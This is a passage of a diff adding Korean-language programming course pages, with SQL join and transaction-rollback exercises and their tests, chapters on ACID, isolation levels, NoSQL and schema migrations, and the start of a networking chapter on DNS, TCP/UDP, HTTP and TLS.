+inner = query_inner_join(conn)
+assert inner is not None, "query_inner_join returned None"
+assert len(inner) == 5, f"INNER JOIN should return 5 rows, got {len(inner)}"
+titles = [r[0] for r in inner]
+assert "Orphan task" not in titles, "INNER JOIN should exclude orphan task"
+
+left = query_left_join(conn)
+assert left is not None, "query_left_join returned None"
+assert len(left) == 6, f"LEFT JOIN should return 6 rows, got {len(left)}"
+orphan = [r for r in left if r[0] == "Orphan task"]
+assert len(orphan) == 1, "Orphan task should appear in LEFT JOIN"
+assert orphan[0][1] is None, "Orphan task's category should be None"
+
+ranked = query_window_rank(conn)
+assert ranked is not None, "query_window_rank returned None"
+assert len(ranked) == 5, f"Window query should return 5 rows, got {len(ranked)}"
+cat1 = [r for r in ranked if r[1] == 1]
+assert cat1[0][3] == 1, "Highest priority in Bugs should be rank 1"
+assert cat1[0][0] == "Fix login crash", "Fix login crash should be rank 1 in Bugs"
+print("All SQL tests passed!")
+    </script>
+  </div>
+  <div class="exercise-controls">
+    <button class="ex-run">실행</button>
+    <button class="ex-check">확인</button>
+    <button class="ex-hint" data-level="0">힌트</button>
+    <button class="ex-reset">초기화</button>
+  </div>
+  <div class="exercise-output"></div>
+  <div class="exercise-tests"></div>
+  <div class="exercise-hints">
+    <p class="hint">INNER JOIN: <code>SELECT tasks.title, categories.name FROM tasks INNER JOIN categories ON tasks.category_id = categories.id</code>. <code>conn.execute(sql).fetchall()</code>을 사용하십시오.</p>
+    <p class="hint">LEFT JOIN: INNER JOIN을 LEFT JOIN으로 변경하십시오. 이렇게 하면 category_id가 NULL인 태스크도 포함됩니다.</p>
+    <p class="hint">윈도우 함수: <code>SELECT title, category_id, priority, ROW_NUMBER() OVER (PARTITION BY category_id ORDER BY priority DESC) AS rank FROM tasks WHERE category_id IS NOT NULL</code></p>
+  </div>
+</div>
+
+</section>
+
+
+<!-- ===== CH 30 ===== -->
+<section id="ch30" data-ch="30">
+<h2><span class="ch-label">Chapter 30</span> 트랜잭션, NoSQL과 데이터 진화</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">지금 이것이 중요한 이유</div>
+<p>두 명의 사용자가 같은 태스크를 동시에 업데이트하면 어떻게 됩니까? 관련 레코드를 저장하는 도중에 서버가 충돌하면 어떻게 됩니까? 트랜잭션(transaction)은 이러한 위험으로부터 데이터를 보호합니다. 그리고 때로는 관계형 데이터베이스가 올바른 도구가 아닐 수도 있는데, NoSQL을 이해하면 현명하게 선택할 수 있는 어휘를 갖추게 됩니다.</p>
+</div>
+
+<h3>트랜잭션과 ACID</h3>
+
+<p><strong>트랜잭션(transaction)</strong>은 모두 성공하거나 모두 실패해야 하는 데이터베이스 작업의 그룹입니다. 중간 상태는 없습니다. 이를 보장하는 속성을 <strong>ACID</strong>라고 합니다.</p>
+
+<p><strong>원자성 (Atomicity):</strong> 트랜잭션의 모든 작업이 성공하거나 하나도 성공하지 않습니다. 5단계 중 3단계가 실패하면 1, 2단계가 발생하지 않은 것처럼 롤백됩니다.</p>
+
+<p><strong>일관성 (Consistency):</strong> 트랜잭션은 데이터베이스를 하나의 유효한 상태에서 다른 유효한 상태로 이동시킵니다. 제약 조건(외래 키, 고유 규칙, 체크 제약)이 항상 적용됩니다.</p>
+
+<p><strong>격리성 (Isolation):</strong> 동시 트랜잭션은 서로 간섭하지 않습니다. 각 트랜잭션은 자신만 실행 중인 것처럼 데이터베이스를 봅니다(격리 수준은 설정 가능).</p>
+
+<p><strong>지속성 (Durability):</strong> 커밋된 데이터는 충돌, 전원 장애, 재시작 후에도 살아남습니다.</p>
+
+<!-- ACID SVG Diagram -->
+<svg viewBox="0 0 700 290" aria-label="ACID properties illustrated with a bank transfer example: debit from Account A and credit to Account B must both succeed or both fail as a single atomic unit" style="width:100%;max-width:700px;margin:1.5rem auto;display:block">
+  <text x="350" y="22" class="label-text" text-anchor="middle" font-size="14" font-weight="600">Bank Transfer: $100 from Account A to Account B</text>
+
+  <rect x="40" y="42" width="155" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="117" y="66" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Account A</text>
+  <text x="117" y="88" class="sub-text" text-anchor="middle" font-size="12">Balance: $500</text>
+
+  <rect x="505" y="42" width="155" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="582" y="66" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Account B</text>
+  <text x="582" y="88" class="sub-text" text-anchor="middle" font-size="12">Balance: $200</text>
+
+  <rect x="160" y="130" width="380" height="85" rx="10" class="node-accent" stroke="var(--accent)" stroke-width="2" stroke-dasharray="6,3"/>
+  <text x="350" y="152" class="label-text" text-anchor="middle" font-size="12" font-weight="600">BEGIN TRANSACTION</text>
+  <text x="350" y="172" class="sub-text" text-anchor="middle" font-size="11">UPDATE accounts SET balance = 400 WHERE id = 'A'</text>
+  <text x="350" y="190" class="sub-text" text-anchor="middle" font-size="11">UPDATE accounts SET balance = 300 WHERE id = 'B'</text>
+  <text x="350" y="208" class="label-text" text-anchor="middle" font-size="12" font-weight="600">COMMIT</text>
+
+  <line x1="195" y1="102" x2="260" y2="130" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="505" y1="102" x2="440" y2="130" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+
+  <text x="100" y="255" class="label-text" text-anchor="middle" font-size="12" font-weight="600" fill="var(--accent)">Atomicity</text>
+  <text x="100" y="275" class="sub-text" text-anchor="middle" font-size="10">Both or neither</text>
+  <text x="280" y="255" class="label-text" text-anchor="middle" font-size="12" font-weight="600" fill="var(--accent)">Consistency</text>
+  <text x="280" y="275" class="sub-text" text-anchor="middle" font-size="10">Totals always balance</text>
+  <text x="450" y="255" class="label-text" text-anchor="middle" font-size="12" font-weight="600" fill="var(--accent)">Isolation</text>
+  <text x="450" y="275" class="sub-text" text-anchor="middle" font-size="10">Others see old or new</text>
+  <text x="620" y="255" class="label-text" text-anchor="middle" font-size="12" font-weight="600" fill="var(--accent)">Durability</text>
+  <text x="620" y="275" class="sub-text" text-anchor="middle" font-size="10">Survives crashes</text>
+</svg>
+
+<pre style="overflow-x:auto"><code>import sqlite3
+
+conn = sqlite3.connect("bank.db")
+cursor = conn.cursor()
+
+try:
+    cursor.execute("UPDATE accounts SET balance = balance - 100 WHERE id = 'A'")
+    cursor.execute("UPDATE accounts SET balance = balance + 100 WHERE id = 'B'")
+    conn.commit()    # Both succeed
+except Exception:
+    conn.rollback()  # Both fail &mdash; Account A keeps its money</code></pre>
+
+<h3>격리 수준 (Isolation Levels)</h3>
+
+<p>격리는 이진적이지 않습니다. 스펙트럼이 있습니다. 더 엄격한 격리는 더 많은 안전성을 의미하지만 동시성이 낮아집니다.</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>트랜잭션 격리 수준과 트레이드오프</caption>
+<thead><tr><th>격리 수준</th><th>더티 읽기</th><th>반복 불가능 읽기</th><th>팬텀 읽기</th><th>사용 사례</th></tr></thead>
+<tbody>
+<tr><td><strong>Read Uncommitted</strong></td><td>가능</td><td>가능</td><td>가능</td><td>거의 사용 안 함; 최고 속도</td></tr>
+<tr><td><strong>Read Committed</strong></td><td>방지</td><td>가능</td><td>가능</td><td>PostgreSQL 기본값</td></tr>
+<tr><td><strong>Repeatable Read</strong></td><td>방지</td><td>방지</td><td>가능</td><td>MySQL 기본값; 재무 보고</td></tr>
+<tr><td><strong>Serializable</strong></td><td>방지</td><td>방지</td><td>방지</td><td>뱅킹, 중요 시스템</td></tr>
+</tbody>
+</table>
+</div>
+
+<p><strong>더티 읽기 (Dirty read):</strong> 트랜잭션 A가 트랜잭션 B가 수정했지만 아직 커밋하지 않은 데이터를 읽습니다. B가 롤백하면 A는 실제로 존재한 적 없는 데이터를 읽은 것입니다.</p>
+
+<p><strong>반복 불가능 읽기 (Non-repeatable read):</strong> 트랜잭션 A가 행을 읽고, B가 수정하여 커밋한 후, A가 다시 읽으면 다른 값을 얻습니다.</p>
+
+<p><strong>팬텀 읽기 (Phantom read):</strong> 트랜잭션 A가 조건에 맞는 행을 쿼리하고, B가 새로운 일치 행을 삽입하여 커밋한 후, A가 재쿼리하면 이전에 없던 "팬텀" 행이 보입니다.</p>
+
+<h3>교착 상태 (Deadlocks)</h3>
+
+<p><strong>교착 상태(deadlock)</strong>는 두 트랜잭션이 각각 상대방이 필요로 하는 잠금을 보유할 때 발생합니다. 둘 다 진행할 수 없어서 영원히 기다립니다.</p>
+
+<pre style="overflow-x:auto"><code># Transaction 1:                    Transaction 2:
+# Lock row A                        Lock row B
+# Try to lock row B (WAIT...)       Try to lock row A (WAIT...)
+# ... deadlock!                     ... deadlock!</code></pre>
+
+<p><strong>방지 전략:</strong></p>
+<ul>
+<li>항상 같은 순서로 잠금을 획득합니다(예: 항상 낮은 ID를 먼저 잠금)</li>
+<li>트랜잭션을 짧게 유지합니다 — 잠금 보유 시간이 짧을수록 충돌 가능성이 낮아집니다</li>
+<li>타임아웃을 사용하여 차단된 트랜잭션이 영원히 기다리는 대신 포기하게 합니다</li>
+<li>대부분의 데이터베이스는 교착 상태를 자동으로 감지하고 한 트랜잭션을 롤백합니다</li>
+</ul>
+
+<h3>커넥션 풀링 (Connection Pooling)</h3>
+
+<p>모든 데이터베이스 연결에는 오버헤드가 있습니다: TCP 설정, 인증, 메모리 할당. <strong>커넥션 풀(connection pool)</strong>은 미리 열어 둔 연결을 유지합니다. 코드에서 연결이 필요하면 풀에서 빌리고 완료 후 반환합니다.</p>
+
+<pre style="overflow-x:auto"><code># Conceptual connection pool (real systems use SQLAlchemy or similar)
+class ConnectionPool:
+    def __init__(self, db_path, pool_size=5):
+        self._available = [sqlite3.connect(db_path) for _ in range(pool_size)]
+        self._in_use = []
+
+    def get_connection(self):
+        if not self._available:
+            raise Exception("No connections available")
+        conn = self._available.pop()
+        self._in_use.append(conn)
+        return conn
+
+    def return_connection(self, conn):
+        self._in_use.remove(conn)
+        self._available.append(conn)</code></pre>
+
+<h3>NoSQL 전경</h3>
+
+<p>관계형 데이터베이스(SQL)는 대부분의 경우 올바른 선택입니다. 그러나 특정 워크로드는 다른 데이터 모델에서 이점을 얻습니다. 주요 NoSQL 범주는 네 가지입니다.</p>
+
+<h4>문서 저장소 (Document Stores, 예: MongoDB)</h4>
+
+<p>데이터를 JSON과 유사한 문서로 저장합니다. 각 문서는 다른 구조를 가질 수 있습니다. 콘텐츠 관리, 사용자 프로필, 카탈로그에 적합합니다.</p>
+
+<pre style="overflow-x:auto"><code># TaskForge as a document:
+{
+    "_id": "task-001",
+    "title": "Fix login bug",
+    "priority": "high",
+    "assignee": {"name": "Alice", "email": "alice@example.com"},
+    "comments": [
+        {"author": "Bob", "text": "Reproduced on Chrome", "date": "2026-03-15"}
+    ]
+}</code></pre>
+
+<h4>키-값 저장소 (Key-Value Stores, 예: Redis)</h4>
+
+<p>단순합니다: 키가 값에 매핑됩니다. 매우 빠르며(종종 인메모리). 캐싱, 세션 저장, 속도 제한에 사용됩니다.</p>
+
+<h4>컬럼 패밀리 저장소 (Column-Family Stores, 예: Cassandra)</h4>
+
+<p>여러 서버에서 대량의 데이터를 쓰고 읽는 데 최적화되어 있습니다. 시계열 데이터, IoT 로그, 대규모 이벤트 추적에 사용됩니다.</p>
+
+<h4>그래프 데이터베이스 (Graph Databases, 예: Neo4j)</h4>
+
+<p>데이터를 노드와 엣지(관계)로 저장합니다. 소셜 네트워크, 추천 엔진, 사기 감지에 사용됩니다.</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>NoSQL 데이터베이스 유형과 사용 사례</caption>
+<thead><tr><th>유형</th><th>최적 용도</th><th>부적합한 경우</th><th>예시</th></tr></thead>
+<tbody>
+<tr><td>문서</td><td>다양한 스키마, 중첩 데이터</td><td>복잡한 조인</td><td>MongoDB, CouchDB</td></tr>
+<tr><td>키-값</td><td>캐싱, 세션</td><td>복잡한 쿼리</td><td>Redis, DynamoDB</td></tr>
+<tr><td>컬럼 패밀리</td><td>쓰기 집약적, 시계열</td><td>임시 쿼리</td><td>Cassandra, HBase</td></tr>
+<tr><td>그래프</td><td>고도로 연결된 데이터</td><td>대량 분석</td><td>Neo4j, Neptune</td></tr>
+</tbody>
+</table>
+</div>
+
+<div role="note" class="callout warn">
+<div class="callout-title">주의: NoSQL이 SQL보다 빠르다는 것은 잘못된 믿음입니다</div>
+<p>이것은 위험한 과도한 단순화입니다. NoSQL 데이터베이스는 유연성을 희생하고 <em>특정</em> 접근 패턴에 최적화됩니다. 잘 인덱싱된 PostgreSQL 데이터베이스는 대부분의 범용 워크로드에서 MongoDB를 능가합니다. 과장된 선전이 아닌 데이터 모델과 접근 패턴을 기반으로 선택하십시오. SQL로 시작하고 구체적인 이유가 있을 때만 마이그레이션하십시오.</p>
+</div>
+
+<h3>스키마 마이그레이션 (Schema Migrations)</h3>
+
+<p>데이터베이스 스키마는 시간이 지남에 따라 변합니다: 새 컬럼, 이름 변경된 필드, 새 테이블. <strong>스키마 마이그레이션(schema migration)</strong>은 구조를 발전시키는 버전 관리된 스크립트입니다.</p>
+
+<pre style="overflow-x:auto"><code># Migration 001: initial schema
+"""
+CREATE TABLE tasks (
+    id INTEGER PRIMARY KEY,
+    title TEXT NOT NULL,
+    done BOOLEAN DEFAULT 0
+);
+"""
+
+# Migration 002: add priority column
+"""
+ALTER TABLE tasks ADD COLUMN priority TEXT DEFAULT 'medium';
+"""
+
+# Migration 003: add categories (zero-downtime approach)
+"""
+-- Step 1: Add nullable column (safe, no breaking change)
+ALTER TABLE tasks ADD COLUMN category_id INTEGER;
+-- Step 2: Backfill existing rows (in application code, gradually)
+-- Step 3: Add constraint once all data is valid
+"""</code></pre>
+
+<p><strong>무중단 마이그레이션(zero-downtime migration)</strong>은 신중한 순서를 따릅니다: 컬럼을 nullable로 추가하고, 이전 컬럼과 새 컬럼 모두에 쓰는 코드를 배포하고, 기존 데이터를 백필(backfill)하고, 마지막으로 제약을 추가하거나 이전 컬럼을 삭제합니다. 실행 중인 코드가 아직 읽는 컬럼은 절대 삭제하지 마십시오.</p>
+
+<div role="note" class="callout info">
+<div class="callout-title">TaskForge 연결</div>
+<p>TaskForge에 번호가 매겨진 SQL 파일이 있는 <code>migrations/</code> 디렉터리를 만드십시오. <code>category_id</code> 컬럼을 추가하고, 카테고리 테이블을 만들고, 카테고리 할당을 백필하는 마이그레이션을 작성하십시오. 또한 TaskForge 데이터가 문서 저장소로 어떻게 보일지 스케치해 보십시오. 더 단순할지 더 복잡할지 생각해 보십시오.</p>
+</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">직접 해보기 &mdash; ACID 사고 실험</div>
+<p>TaskForge에 "태스크를 다른 프로젝트로 이동" 기능이 있다고 상상하십시오: (1) 이전 프로젝트에서 태스크 제거, (2) 새 프로젝트에 추가, (3) 태스크의 project_id 업데이트. 1단계 이후 3단계 이전에 서버가 충돌하면 어떻게 됩니까? 이를 안전하게 만드는 트랜잭션을 작성하십시오.</p>
+</div>
+
+<!-- Ch30 Quiz -->
+<div class="quiz" data-ch="30" data-ex="isolation-levels">
+  <h4>핵심 개념 확인</h4>
+  <p>팬텀 읽기를 방지하는 격리 수준은 무엇입니까?</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false">Read Uncommitted</button>
+    <button class="quiz-option" data-correct="false">Read Committed</button>
+    <button class="quiz-option" data-correct="false">Repeatable Read</button>
+    <button class="quiz-option" data-correct="true">Serializable</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch30 Pyodide Exercise -->
+<div class="exercise" data-type="pyodide" data-ch="30" data-ex="transaction-rollback">
+  <div class="exercise-header">
+    <h4>연습: 트랜잭션 롤백</h4>
+    <span class="exercise-status"></span>
+  </div>
+  <p class="exercise-prompt"><code>sqlite3</code>를 사용하여 트랜잭션 롤백을 시연하십시오. 두 행(Alice: $1000, Bob: $500)이 있는 <code>accounts</code> 테이블을 만드십시오. 돈을 원자적으로 이동하는 <code>transfer(conn, from_name, to_name, amount)</code> 함수를 작성하십시오. 발신자의 잔액이 부족하면 <code>ValueError</code>를 발생시키고 롤백하여 돈이 손실되지 않도록 하십시오.</p>
+  <div class="exercise-editor">
+    <script type="text/plain" class="starter-code">
+import sqlite3
+
+def setup_accounts():
+    conn = sqlite3.connect(":memory:")
+    conn.execute("""CREATE TABLE accounts (
+        name TEXT PRIMARY KEY,
+        balance REAL NOT NULL
+    )""")
+    conn.execute("INSERT INTO accounts VALUES ('Alice', 1000)")
+    conn.execute("INSERT INTO accounts VALUES ('Bob', 500)")
+    conn.commit()
+    return conn
+
+def transfer(conn, from_name, to_name, amount):
+    """Transfer amount from from_name to to_name.
+    Raise ValueError if insufficient funds (and roll back).
+    Return dict of all balances after the transfer."""
+    # TODO: implement with proper transaction handling
+    pass
+
+def get_balances(conn):
+    """Return dict of name -> balance."""
+    rows = conn.execute("SELECT name, balance FROM accounts").fetchall()
+    return {name: balance for name, balance in rows}
+
+conn = setup_accounts()
+    </script>
+    <script type="text/plain" class="test-code">
+# Test successful transfer
+result = transfer(conn, "Alice", "Bob", 200)
+assert result["Alice"] == 800, f"Alice should have 800, got {result['Alice']}"
+assert result["Bob"] == 700, f"Bob should have 700, got {result['Bob']}"
+
+# Test failed transfer (insufficient funds)
+try:
+    transfer(conn, "Bob", "Alice", 9999)
+    assert False, "Should have raised ValueError for insufficient funds"
+except ValueError:
+    pass  # Expected
+
+# Verify balances unchanged after failed transfer (rollback worked!)
+balances = get_balances(conn)
+assert balances["Alice"] == 800, f"Alice should still be 800, got {balances['Alice']}"
+assert balances["Bob"] == 700, f"Bob should still be 700, got {balances['Bob']}"
+
+# Test another successful transfer
+result2 = transfer(conn, "Bob", "Alice", 100)
+assert result2["Alice"] == 900, f"Alice should have 900, got {result2['Alice']}"
+assert result2["Bob"] == 600, f"Bob should have 600, got {result2['Bob']}"
+print("All transaction tests passed!")
+    </script>
+  </div>
+  <div class="exercise-controls">
+    <button class="ex-run">실행</button>
+    <button class="ex-check">확인</button>
+    <button class="ex-hint" data-level="0">힌트</button>
+    <button class="ex-reset">초기화</button>
+  </div>
+  <div class="exercise-output"></div>
+  <div class="exercise-tests"></div>
+  <div class="exercise-hints">
+    <p class="hint">먼저 발신자의 잔액을 쿼리하십시오. amount보다 적으면 아무것도 수정하기 전에 ValueError를 발생시키십시오.</p>
+    <p class="hint">두 개의 UPDATE 문을 사용하십시오: <code>UPDATE accounts SET balance = balance - ? WHERE name = ?</code>와 대응하는 추가. 둘 다 성공한 후 conn.commit()을 호출하십시오.</p>
+    <p class="hint">업데이트를 try/except로 감싸십시오. except 블록에서 conn.rollback()을 호출하고 예외를 다시 발생시키십시오. 성공적인 이전 마지막에 get_balances(conn)을 반환하십시오.</p>
+  </div>
+</div>
+
+</section>
+
+
+<!-- ===== CH 31 ===== -->
+<section id="ch31" data-ch="31">
+<h2><span class="ch-label">Chapter 31</span> 네트워킹과 인터넷</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">지금 이것이 중요한 이유</div>
+<p>모든 API 호출, 모든 <code>git push</code>, 모든 웹 페이지 로드는 네트워크를 통해 이동합니다. TaskForge API가 느릴 때 코드의 문제입니까, 데이터베이스입니까, 아니면 네트워크입니까? 인터넷이 작동하는 방식을 이해하면 애플리케이션 수준 코드만 아는 사람에게는 보이지 않는 문제를 진단할 수 있습니다.</p>
+</div>
+
+<h3>TCP/IP 스택</h3>
+
+<p>인터넷은 <strong>레이어(layer)</strong>로 구축됩니다. 각 레이어는 특정 역할을 하며 위아래 레이어와 통신합니다.</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>인터넷 프로토콜 스택 레이어</caption>
+<thead><tr><th>레이어</th><th>이름</th><th>역할</th><th>프로토콜</th></tr></thead>
+<tbody>
+<tr><td>5</td><td><strong>애플리케이션</strong></td><td>코드가 직접 다루는 계층 — 웹 요청, DNS, 이메일</td><td>HTTP, HTTPS, DNS, SMTP, SSH</td></tr>
+<tr><td>4</td><td><strong>전송</strong></td><td>프로세스 간 신뢰성 있는(TCP) 또는 빠른(UDP) 전달</td><td>TCP, UDP</td></tr>
+<tr><td>3</td><td><strong>네트워크</strong></td><td>IP 주소를 사용하여 네트워크 간 패킷 라우팅</td><td>IP (IPv4, IPv6)</td></tr>
+<tr><td>2</td><td><strong>링크</strong></td><td>로컬 네트워크를 위한 데이터 프레이밍</td><td>Ethernet, Wi-Fi</td></tr>
+<tr><td>1</td><td><strong>물리</strong></td><td>케이블이나 전파의 전기/광학 신호</td><td>케이블, 라디오, 광섬유</td></tr>
+</tbody>
+</table>
+</div>
+
+<p>개발자로서 대부분의 시간을 4번과 5번 레이어에서 보냅니다. 그러나 지연(latency)이나 연결 실패를 디버깅할 때는 하위 레이어를 이해하면 올바른 질문을 할 수 있습니다.</p>
+
+<h3>DNS &mdash; 이름을 주소로 변환하기</h3>
+
+<p>브라우저에 <code>api.taskforge.dev</code>를 입력하면 컴퓨터는 <strong>DNS</strong>(Domain Name System, 도메인 이름 시스템) 서버에 사람이 읽기 쉬운 이름을 <code>93.184.216.34</code>같은 IP 주소로 번역하도록 요청합니다.</p>
+
+<p>해석 체인: 로컬 캐시 확인 &rarr; DNS 리졸버에 요청 &rarr; 루트 네임서버 &rarr; TLD 네임서버(.dev) &rarr; 권한 있는 네임서버 &rarr; IP 반환 및 <strong>TTL</strong>(Time to Live, 유효 시간)과 함께 캐싱.</p>
+
+<pre style="overflow-x:auto"><code># Debugging DNS from the terminal
+$ dig api.taskforge.dev
+
+;; ANSWER SECTION:
+api.taskforge.dev.   300   IN    A    93.184.216.34
+#                    TTL         Type  IP address</code></pre>
+
+<h3>TCP 대 UDP</h3>
+
+<p><strong>TCP</strong>(Transmission Control Protocol, 전송 제어 프로토콜)는 <strong>3방향 핸드셰이크(three-way handshake)</strong>를 통해 신뢰성 있고 순서가 보장된 전달을 제공합니다.</p>
+
+<ol>
+<li><strong>SYN:</strong> 클라이언트가 "연결하고 싶습니다"라고 말합니다</li>
+<li><strong>SYN-ACK:</strong> 서버가 "확인했습니다. 저도 연결하고 싶습니다"라고 응답합니다</li>
+<li><strong>ACK:</strong> 클라이언트가 "확인했습니다. 연결되었습니다"라고 말합니다</li>
+</ol>
+
+<p>이 핸드셰이크 후 데이터가 신뢰성 있게 흐릅니다. 손실된 패킷은 재전송됩니다. 순서가 맞지 않는 패킷은 재정렬됩니다.</p>
+
+<p><strong>UDP</strong>(User Datagram Protocol, 사용자 데이터그램 프로토콜)는 핸드셰이크를 완전히 건너뜁니다. 패킷을 보내고 도착하기를 기대합니다. 더 빠르지만 신뢰성이 없습니다.</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>TCP 대 UDP 기능 비교</caption>
+<thead><tr><th>기능</th><th>TCP</th><th>UDP</th></tr></thead>
+<tbody>
+<tr><td>연결 설정</td><td>3방향 핸드셰이크</td><td>없음 (비연결성)</td></tr>
+<tr><td>신뢰성</td><td>배달 보장, 순서 보장</td><td>최선 노력, 패킷 손실 가능</td></tr>
+<tr><td>속도</td><td>느림 (오버헤드)</td><td>빠름 (오버헤드 없음)</td></tr>
+<tr><td>사용 사례</td><td>웹, 이메일, 파일 전송, API</td><td>비디오 스트리밍, 게임, DNS, VoIP</td></tr>
+</tbody>
+</table>
+</div>
+
+<h3>HTTP 심층 분석</h3>
+
+<p>HTTP는 웹과 대부분의 API를 구동하는 애플리케이션 레이어 프로토콜입니다. 13장에서 사용했으며, 이제 더 깊이 살펴보겠습니다.</p>
+
+<h4>메서드</h4>
+
+<div style="overflow-x:auto">
+<table>
+<caption>HTTP 메서드와 속성</caption>
+<thead><tr><th>메서드</th><th>목적</th><th>본문 있음?</th><th>멱등성?</th></tr></thead>
+<tbody>
+<tr><td><strong>GET</strong></td><td>리소스 조회</td><td>아니오</td><td>예</td></tr>
+<tr><td><strong>POST</strong></td><td>새 리소스 생성</td><td>예</td><td>아니오</td></tr>
+<tr><td><strong>PUT</strong></td><td>리소스 전체 교체</td><td>예</td><td>예</td></tr>
+<tr><td><strong>PATCH</strong></td><td>리소스 부분 업데이트</td><td>예</td><td>아니오*</td></tr>
+<tr><td><strong>DELETE</strong></td><td>리소스 제거</td><td>선택</td><td>예</td></tr>
+</tbody>
+</table>
+</div>
+
+<p><strong>멱등성(Idempotent)</strong>이란 여러 번 호출해도 같은 결과를 낸다는 의미입니다. 동일한 PUT 요청을 두 번 보내도 같은 리소스 상태가 됩니다. POST를 두 번 보내면 두 개의 리소스가 생성될 수 있습니다.</p>
+
+<h4>상태 코드</h4>
+
+<pre style="overflow-x:auto"><code># 2xx &mdash; Success
+200 OK                  # Request succeeded
+201 Created             # Resource created (after POST)
+204 No Content          # Success, nothing to return (after DELETE)
+
+# 3xx &mdash; Redirection
+301 Moved Permanently   # Update your URL
+304 Not Modified        # Cached version is still valid
+
+# 4xx &mdash; Client Error (your fault)
+400 Bad Request         # Malformed request
+401 Unauthorized        # Not authenticated (who are you?)
+403 Forbidden           # Authenticated but not authorised (you can't do that)
+404 Not Found           # Resource does not exist
+429 Too Many Requests   # Rate limited
+
+# 5xx &mdash; Server Error (their fault)
+500 Internal Error      # Generic server failure
+502 Bad Gateway         # Proxy got bad response from upstream
+503 Service Unavailable # Server overloaded or in maintenance</code></pre>
+
+<h4>헤더, 쿠키와 세션</h4>
+
+<p><strong>헤더(Header)</strong>는 메타데이터를 전달합니다: <code>Content-Type</code>(본문 형식), <code>Authorization</code>(자격 증명), <code>Accept</code>(클라이언트가 이해하는 형식).</p>
+
+<p><strong>쿠키(Cookie)</strong>는 서버가 <code>Set-Cookie</code> 헤더를 통해 클라이언트에 저장하는 소형 데이터 조각입니다. 해당 도메인에 대한 이후 모든 요청과 함께 자동으로 전송됩니다.</p>
+
+<p><strong>세션(Session)</strong>은 쿠키(세션 ID 포함)와 서버 측 데이터를 연결합니다. 서버는 로그인 시 세션을 생성하고 ID가 담긴 쿠키를 제공하며, 이후 요청에서 세션을 조회하여 사용자를 식별합니다.</p>
+
+<h4>HTTP/2 개선 사항</h4>
+
+<p>HTTP/2는 멀티플렉싱(단일 연결에서 여러 요청), 헤더 압축, 서버 푸시를 도입했습니다. 코드를 변경할 필요가 없으며, 웹 서버와 브라우저가 자동으로 처리합니다.</p>
+
+<h3>TLS/HTTPS</h3>
+
+<p><strong>TLS</strong>(Transport Layer Security, 전송 계층 보안)는 클라이언트와 서버 간의 연결을 암호화합니다. HTTPS는 TLS 위의 HTTP입니다. 단순화된 핸드셰이크:</p>
+
+<ol>
+<li>클라이언트가 지원하는 암호 스위트와 함께 "Hello"를 보냅니다</li>
+<li>서버가 <strong>인증서(certificate)</strong>(신원 증명)와 선택한 암호를 보냅니다</li>
+<li>클라이언트가 신뢰할 수 있는 인증 기관에 대해 인증서를 검증합니다</li>
+<li>양측이 <strong>비대칭 암호화(asymmetric encryption)</strong>(느리고 일회성)를 사용하여 키를 교환합니다</li>
+<li>나머지 세션에서 <strong>대칭 암호화(symmetric encryption)</strong>(빠름)로 전환합니다</li>
+</ol>
+
+<h3>웹소켓 (WebSockets)</h3>
+
+<p>일반 HTTP는 요청/응답 방식입니다. 실시간 기능을 위해서는 서버가 클라이언트로 데이터를 <em>푸시</em>해야 합니다. <strong>웹소켓(WebSocket)</strong>은 HTTP 연결을 양측이 언제든지 메시지를 보낼 수 있는 영구적인 전이중(full-duplex) 채널로 업그레이드합니다.</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>실시간 통신 방식 비교</caption>
+<thead><tr><th>방식</th><th>작동 방식</th><th>최적 용도</th></tr></thead>
+<tbody>
+<tr><td><strong>폴링 (Polling)</strong></td><td>클라이언트가 N초마다 요청</td><td>단순 대시보드, 저빈도</td></tr>
+<tr><td><strong>서버 전송 이벤트 (Server-Sent Events)</strong></td><td>서버가 단방향 스트림 푸시</td><td>뉴스 피드, 라이브 스코어</td></tr>
+<tr><td><strong>웹소켓 (WebSockets)</strong></td><td>전이중; 양측이 언제든지 전송</td><td>채팅, 게임, 협업 편집</td></tr>
+</tbody>
+</table>
+</div>
+
+<!-- HTTP Request Journey SVG -->
+<svg viewBox="0 0 720 220" aria-label="Journey of an HTTP request: browser performs DNS lookup, then TCP handshake, then TLS handshake, sends the HTTP request, server processes it, and sends the HTTP response back" style="width:100%;max-width:720px;margin:1.5rem auto;display:block">
+  <rect x="5" y="45" width="90" height="52" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="50" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">1. DNS</text>
+  <text x="50" y="83" class="sub-text" text-anchor="middle" font-size="9">Name &rarr; IP</text>
+
+  <rect x="118" y="45" width="90" height="52" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="163" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">2. TCP</text>
+  <text x="163" y="83" class="sub-text" text-anchor="middle" font-size="9">SYN/ACK</text>
+
+  <rect x="231" y="45" width="90" height="52" rx="6" class="node-accent" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="276" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">3. TLS</text>
+  <text x="276" y="83" class="sub-text" text-anchor="middle" font-size="9">Cert + encrypt</text>
+
+  <rect x="344" y="45" width="90" height="52" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="389" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">4. HTTP</text>
+  <text x="389" y="83" class="sub-text" text-anchor="middle" font-size="9">GET /tasks</text>
+
